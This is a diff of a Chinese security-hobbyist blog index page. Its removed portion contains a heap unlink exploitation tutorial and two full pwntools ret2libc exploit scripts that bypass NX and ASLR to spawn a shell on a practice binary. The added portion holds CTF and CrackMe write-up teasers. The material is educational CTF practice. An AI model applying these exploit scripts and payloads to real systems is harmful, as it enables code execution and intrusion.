@@ -131,470 +131,6 @@
       <div class="body-wrap">
         
   
-    <article id="post-堆溢出的unlink利用" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/04/堆溢出的unlink利用/">堆溢出的unlink利用</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a>
-<h2 id="0x01-关于chunk："><a href="#0x01-关于chunk：" class="headerlink" title="0x01 关于chunk："></a>0x01 关于chunk：</h2><p>当一个chunk被分配使用，最开始只有前两个变量会被用到，prev_size是前一块chunk的大小，前提是前一块chunk状态是free，如果前一块还在被使用，这4个字节会被前一块chunk共享使用以提高空间使用率，也就是说前一块chunk多了4字节。size是当前chunk的大小。如果当前块的状态是free，就会使用两个额外的变量：fd和bk，这两个变量指向双向链表中的前后节点。</p>
-<p>如何知道一个chunk是处于use还是free状态呢？<br>chunk的结构被强加了一个8字节对齐，这就导致块大小的最低三位总是零，所以只用高29位储存size，低三位储存其他东西，这种情况下，chunk的最低位被指派为标记它的前一块是已分配还是空闲。<br>比如<br>一个24（0x18）大小的块，它的前一块chunk是已分配:<br>0x00000018 | 0x1 = 0x00000019</p>
-<p>一个40（0x28）大小的块，它的前一块chunk是空闲:<br>0x00000028 | 0x0 = 0x00000028</p>
-<p>通过将自身chunk的地址+size就能得到下一个chunk的地址，然后检查它的头部最低位就能得到自己的状态</p>
-<h2 id="0x02-unlink利用"><a href="#0x02-unlink利用" class="headerlink" title="0x02 unlink利用"></a>0x02 unlink利用</h2><p>关于堆的unlink利用，在低版本的libc中，因为没加入校验，导致unlink的时候可以通过构造对快进行dordshoot，从而任意执行代码。<br>详情参考：<br><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a></p>
-<p>主要是利用了free当前chunk时，会去检查前一个chunk和后一个chunk是否是空闲状态，如果是空闲，则会执行unlink，这就让我们有机可乘。但是，由于如今的glibc加入了校验机制，所以就要另想办法进行绕过。</p>
-<p>一下通过一个例子来说明：<br><img src="/image/堆溢出的unlink利用/1.png" alt="这里写图片描述"></p>
-<p>如图，通过两个malloc分配了两个内存：<br>ptr0 = malloc(128)  #返回0x804a008<br>ptr1 = malloc(128)  #返回0x804a090</p>
-<p>我们可以在内存中找到这两个变量存放的地址，假设为0x8049d60:<br><img src="/image/堆溢出的unlink利用/2.png" alt="这里写图片描述"></p>
-<p>这样，我们通过制造chunk0的溢出为如下图：<br><img src="/image/堆溢出的unlink利用/3.png" alt="这里写图片描述"></p>
-<p>这样，我们free掉chunk1之后，会检测chunk1的prev_size(被我们构造成0x80)，这时检测到前一个chunk（即chunk0）为空闲状态（实际上是我们伪造的），就会触发unlink（chunk0）：</p>
-<p>触发unlink时，会检测:（FD指针为chunk头部的指针地址，而不是数据段的指针地址）<br>FD-&gt;bk(0x8049d54+0xc) 的值是否为当前chunk(0x809a008)<br>BK-&gt;fd(0x8049d58+0x8) 的值知否为当前chunk(0x809a008)<br>因为上述两项满足条件，即绕过了检测，所以就glibc就会：<br>FD-&gt;bk = BK   #FD-&gt;bk 为(0x8049d54+0xc)， BK为0x8049d58 ，所以就是将0x8049d60的值设为0x8049d58<br>BK-&gt;fd = FD   #BK-&gt;fd为(0x8049d58+0x8), FD位0x8049d54, 所以就是将0x8049d60的值设为0x8049d54</p>
-<p>这样，在0x8049d60附近的内存就变成了：<br><img src="/image/堆溢出的unlink利用/4.png" alt="这里写图片描述"></p>
-<p>这样，我们如果在通过read(0, ptr1, len)写入数据时，就相当于在0x8049d54处输入数据，我们可以构造这样一个payload：</p>
-<p>payload = ‘A’ * 12 + p32(free_got)<br>内存又变成了：<br>这样，在0x8049d60附近的内存就变成了：<br><img src="/image/堆溢出的unlink利用/5.png" alt="这里写图片描述"></p>
-<p>当再一次通过read(0, ptr1, len)写入数据时，就将free_got指向的内存地址改成我们的输入了（可以是system），当再次调用free时，就是任我们摆布了。</p>
-<p><a href="/2016/04/09/一道unlink的pwn练习/index.html">一道练习加深对unlink的理解</a></p>
-<p>参考链接：<br><a href="http://www.cnblogs.com/0xmuhe/p/5190132.html" target="_blank" rel="external">http://www.cnblogs.com/0xmuhe/p/5190132.html</a><br><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a><br><a href="http://www.tuicool.com/articles/IfYZri3" target="_blank" rel="external">http://www.tuicool.com/articles/IfYZri3</a></p>
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/02/04/堆溢出的unlink利用/" class="archive-article-date">
-  	<time datetime="2017-02-04T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-02-04</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwnable.tw第一题starrt" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/23/pwnable.tw第一题starrt/">pwnable.tw第一题start</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="/image/pwnable.tw第一题start/printf1">printf1</a><br>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/01/23/pwnable.tw第一题starrt/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/01/23/pwnable.tw第一题starrt/" class="archive-article-date">
-  	<time datetime="2017-01-23T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-23</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwn练习(三)之绕过NX和ALSR" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/">pwn练习(三)之绕过NX和ALSR</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a>
-<p>通过一个例子来看看如何使用ret2lib绕过NX和ASLR。</p>
-<p>程序很简单，看IDA:<br><img src="/image/pwn练习三之绕过NX和ALSR/1.png" alt="这里写图片描述"><br><img src="/image/pwn练习三之绕过NX和ALSR/2.png" alt="这里写图片描述"></p>
-<p>很明显的缓冲区溢出。checksec查看，程序开了NX保护，并且可以用命令查看，每次的堆栈都是发生了变化的，说明系统中开了ASLR保护的。<br>sudo cat /proc/[pid]/maps</p>
-<p>给出pwntools的两个脚本：<br>脚本一（给出libc的情况下）：<br>from pwn import *</p>
-<p>p = process(‘./rop’)<br>libc = ELF(‘./libc.so’)<br>elf = ELF(‘./rop’)</p>
-<p>offset = 0xd078-0xcff0+4</p>
-<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d</p>
-<p>print ‘write_plt -&gt; ‘ + hex(write_plt)<br>print ‘write_got -&gt; ‘ + hex(write_got)<br>print ‘vuln -&gt; ‘ + hex(vuln_addr)</p>
-<p>payload = ‘A’ * offset<br>payload += p32(write_plt)<br>payload += p32(vuln_addr)<br>payload += p32(1)<br>payload += p32(write_got)<br>payload += p32(4)</p>
-<p>#gdb.attach(proc.pidof(p)[0], ‘b *0x8048474’)</p>
-<p>#raw_input()</p>
-<p>p.sendline(payload)</p>
-<p>write_addr = u32(p.recv(4))<br>print ‘write_addr -&gt; ‘ + hex(write_addr)</p>
-<p>system_addr = write_addr -  (libc.symbols[‘write’] - libc.symbols[‘system’] )<br>binsh_addr = write_addr -  (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))</p>
-<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(0xdeadbeef)<br>payload += p32(binsh_addr)</p>
-<p>p.sendline(payload)</p>
-<p>p.interactive()</p>
-<p>脚本二（未给出libc的情况下）:<br>from pwn import *</p>
-<p>p = process(‘./rop’)<br>elf = ELF(‘./rop’)</p>
-<p>offset = 0xd078-0xcff0+4</p>
-<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d<br>read_plt = elf.symbols[‘read’]</p>
-<p>def leak(address):<br>    payload = ‘A’ * offset<br>    payload += p32(write_plt)<br>    payload += p32(vuln_addr)<br>    payload += p32(1)<br>    payload += p32(address)<br>    payload += p32(4)</p>
-<pre><code>p.sendline(payload)
-data = p.recv()
-print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>d = DynELF(leak, elf = ELF(‘./rop’))<br>system_addr = d.lookup(“system”, “libc”)</p>
-<p>print ‘system_addr -&gt;’  + hex(system_addr)</p>
-<p>#write ‘/bib/sh’  to .bss</p>
-<p>bss_addr = 0x804a024</p>
-<p>payload = ‘A’ * offset<br>payload += p32(read_plt)<br>payload += p32(vuln_addr)<br>payload += p32(0)<br>payload += p32(bss_addr)<br>payload += p32(8)</p>
-<p>p.sendline(payload)<br>p.sendline(‘/bin/sh’)</p>
-<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(vuln_addr)<br>payload += p32(bss_addr)</p>
-<p>p.sendline(payload)<br>p.interactive()</p>
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/" class="archive-article-date">
-  	<time datetime="2017-01-15T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-15</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwn练习(二)之修改got表" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/04/pwn练习(二)之修改got表/">pwn练习(二)之修改got表</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="/image/pwn练习二之修改got表/bf">bf</a></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/01/04/pwn练习(二)之修改got表/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/01/04/pwn练习(二)之修改got表/" class="archive-article-date">
-  	<time datetime="2017-01-04T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-04</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwn练习(一)之缓冲区溢出" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/29/pwn练习(一)之缓冲区溢出/">pwn练习(一)之缓冲区溢出</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="/image/pwn练习一之缓冲区溢出/passcode">passcode</a></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/29/pwn练习(一)之缓冲区溢出/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/12/29/pwn练习(一)之缓冲区溢出/" class="archive-article-date">
-  	<time datetime="2016-12-29T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-29</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-PWN练习之爆破绕过canary" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/23/PWN练习之爆破绕过canary/">PWN练习之爆破绕过canary</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="/image/PWN练习之爆破绕过canary/test.zip">test</a><br>使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/23/PWN练习之爆破绕过canary/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/12/23/PWN练习之爆破绕过canary/" class="archive-article-date">
-  	<time datetime="2016-12-23T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-23</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-看雪CTF-2016第二十题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/15/看雪CTF-2016第二十题Writeup/">看雪CrackMe第二十题之多线程反调试及程序异常处理</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>源程序：<a href="http://pan.baidu.com/s/1o8wbmVg">http://pan.baidu.com/s/1o8wbmVg</a><br>本题的反调试只有三种，现在理解了之后再去看就比较简单了。由于之前对于多线程的反调试以及程序异常处理（SEH）没有太多的了解，所以结合这题恶补了一下这方面的知识，收获颇多。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/15/看雪CTF-2016第二十题Writeup/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/12/15/看雪CTF-2016第二十题Writeup/" class="archive-article-date">
-  	<time datetime="2016-12-15T09:09:43.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-15</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Linux安全之canary" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/15/Linux安全之canary/">Linux安全之canary</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>首先我们了解一下canary的机制。canary类似于windows中GS机制，普通的函数栈如下：<br>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/15/Linux安全之canary/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/12/15/Linux安全之canary/" class="archive-article-date">
-  	<time datetime="2016-12-15T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-15</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
     <article id="post-看雪CTF-2016第二十一题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -699,6 +235,426 @@ return data
 
 
   
+    <article id="post-看雪CTF-2016第十八题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/09/看雪CTF-2016第十八题Writeup/">看雪CTF-2016第十八题Writeup</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1mhRCPi4">http://pan.baidu.com/s/1mhRCPi4</a><br>这题分析完真的想砸电脑。。。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/12/09/看雪CTF-2016第十八题Writeup/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/12/09/看雪CTF-2016第十八题Writeup/" class="archive-article-date">
+  	<time datetime="2016-12-09T11:38:24.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-09</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CTF-2016第十四题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/06/看雪CTF-2016第十四题Writeup/">看雪CTF-2016第十四题Writeup</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1qXLzbje">http://pan.baidu.com/s/1qXLzbje</a><br>一道shim利用的题目。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/12/06/看雪CTF-2016第十四题Writeup/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/12/06/看雪CTF-2016第十四题Writeup/" class="archive-article-date">
+  	<time datetime="2016-12-06T12:27:46.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-06</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CTF-2016第十题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/21/看雪CTF-2016第十题Writeup/">看雪CTF-2016第十题Writeup</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1cCEpMu">http://pan.baidu.com/s/1cCEpMu</a><br>这是一个很神奇的程序。首先查壳，VS2008写的，无壳。运行起来就退不出了，使用命令行运行，居然连命令行窗口也退不出。估计是调用了EnableWindow之类的函数吧。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/21/看雪CTF-2016第十题Writeup/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/21/看雪CTF-2016第十题Writeup/" class="archive-article-date">
+  	<time datetime="2016-11-21T01:47:57.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-21</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CrackMe第三题之去除花指令" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/20/看雪CrackMe第三题之去除花指令/">看雪CTF-2016第三题之去除花指令</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>附件：<a href="/image/看雪CTF2016第三题之去除花指令/gxustudent.zip">样本</a><br>这道题之做了去花指令的部分，后面的没做出来。。。<br>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/20/看雪CrackMe第三题之去除花指令/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/20/看雪CrackMe第三题之去除花指令/" class="archive-article-date">
+  	<time datetime="2016-11-20T05:26:38.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-20</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CTF-2016第六题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/20/看雪CTF-2016第六题Writeup/">看雪CTF-2016第六题Writeup</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1eSNu1sI">http://pan.baidu.com/s/1eSNu1sI</a></p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/20/看雪CTF-2016第六题Writeup/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/20/看雪CTF-2016第六题Writeup/" class="archive-article-date">
+  	<time datetime="2016-11-20T05:26:38.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-20</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CTF-2016第五题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/19/看雪CTF-2016第五题Writeup/">看雪CTF 2016第五题Writeup(附RC4算法)</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1bpsYvd9">http://pan.baidu.com/s/1bpsYvd9</a><br>首先打开程序，看是VC6写的MFC程序。随便输入一个，点击按钮并没有什么反应。那么就手动去找它的验证函数。</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/19/看雪CTF-2016第五题Writeup/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/19/看雪CTF-2016第五题Writeup/" class="archive-article-date">
+  	<time datetime="2016-11-19T10:51:03.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-19</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-看雪CTF-2016第七题调试部分" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/19/看雪CTF-2016第七题调试部分/">看雪CTF-2016第七题调试部分</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源程序：<a href="http://pan.baidu.com/s/1c2kiXbi">http://pan.baidu.com/s/1c2kiXbi</a><br>由于最后的算法涉及到数学问题，而且需要枚举85位数字+字母的组合。。。感觉这题的作者是要报复社会！其实这题的难点还是挺多的，有必要记录一下这次的收获，对调试多线程有了更深一步的了解。<br>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/19/看雪CTF-2016第七题调试部分/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/19/看雪CTF-2016第七题调试部分/" class="archive-article-date">
+  	<time datetime="2016-11-19T02:46:35.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-19</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
